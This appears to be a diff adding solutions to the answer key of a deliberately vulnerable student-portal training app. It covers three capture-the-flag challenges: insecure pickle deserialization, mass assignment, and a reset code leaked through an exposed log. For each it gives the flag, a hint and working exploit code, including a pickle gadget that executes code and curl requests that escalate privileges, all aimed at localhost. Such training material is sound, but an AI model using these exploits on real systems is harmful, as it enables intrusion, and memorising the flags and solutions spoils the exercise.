@@ -237,6 +237,62 @@ source. Demo student `MHS1007` / `Student@123` reaches every entry point.
 
 ---
 
+## Phase 5d — Integrity and insecure design (Medium)
+
+All three live in the student **account** area (`portal/integrity.py`), plus the
+log viewer in `portal/diagnostics.py`. Each is solved by exploiting it, not by
+reading the source.
+
+### P5D-01 · Insecure deserialization · A08 · `MFANO{p1ckl3_l04ds_r4n_my_c0d3}`
+- **Where:** `GET /account/prefs`. The first visit sets a `mfano_prefs` cookie
+  that is `base64(pickle.dumps({...}))`; the server trusts it and calls
+  `pickle.loads` on whatever comes back. The flag is in the process environment
+  (`MFANO_INTEGRITY_FLAG`), not in any repo file, so recovering it proves code
+  ran on the server.
+- **Exploit:** craft a pickle whose load runs a callable of your choice. Reading
+  the env var is enough to show execution; a subprocess gadget gives full
+  command exec (e.g. `printenv`, `id`).
+  ```python
+  import base64, os, pickle, requests
+  S = requests.Session(); S.post("http://127.0.0.1:8080/login",
+      data={"username":"MHS1007","password":"Student@123"})
+  class P:
+      def __reduce__(self):
+          return (os.getenv, ("MFANO_INTEGRITY_FLAG",))
+  cookie = base64.b64encode(pickle.dumps(P())).decode()
+  print(S.get("http://127.0.0.1:8080/account/prefs",
+              cookies={"mfano_prefs": cookie}).text)
+  ```
+- **Hint:** *decode the prefs cookie — those bytes start with `\x80`.*
+
+### P5D-02 · Mass assignment · A06 · `MFANO{m4ss_4ss1gn_m4d3_m3_r3p}`
+- **Where:** `POST /account/settings`. The form only offers the display name and
+  "about", but the handler writes every submitted field whose name matches a
+  real `students` column. The rep room (`/account/rep-room`) is gated on the
+  `is_rep` column.
+- **Exploit:** confirm the bug by posting `fee_balance=0` and watching the
+  dashboard change, then escalate: post `is_rep=1` and open `/account/rep-room`.
+  ```sh
+  curl -b cookies -c cookies -d "about=hi&is_rep=1" \
+      http://127.0.0.1:8080/account/settings
+  curl -b cookies http://127.0.0.1:8080/account/rep-room   # flag
+  ```
+- **Hint:** *the save handler trusts more fields than the form shows.*
+
+### P5D-03 · Secrets in an exposed log · A09 · `MFANO{l0gs_l34k3d_th3_r3s3t_c0d3}`
+- **Where:** `GET /account/forgot` logs the generated recovery code in cleartext
+  to `logs/portal-security.log`; `GET /diagnostics/logs?name=portal-security.log`
+  serves that log to anyone, with no login. The recovery code logged for the
+  `admin` account is the flag.
+- **Exploit:** request a reset for `admin`, then read the exposed log.
+  ```sh
+  curl -d "username=admin" http://127.0.0.1:8080/account/forgot
+  curl "http://127.0.0.1:8080/diagnostics/logs?name=portal-security.log"
+  ```
+- **Hint:** *the reset confirmation tells you where the audit log lives.*
+
+---
+
 ## The intended chain
 
 Phase 1 (unprotected console) and Phase 3 (SQLi, stored XSS, forgeable cookie)
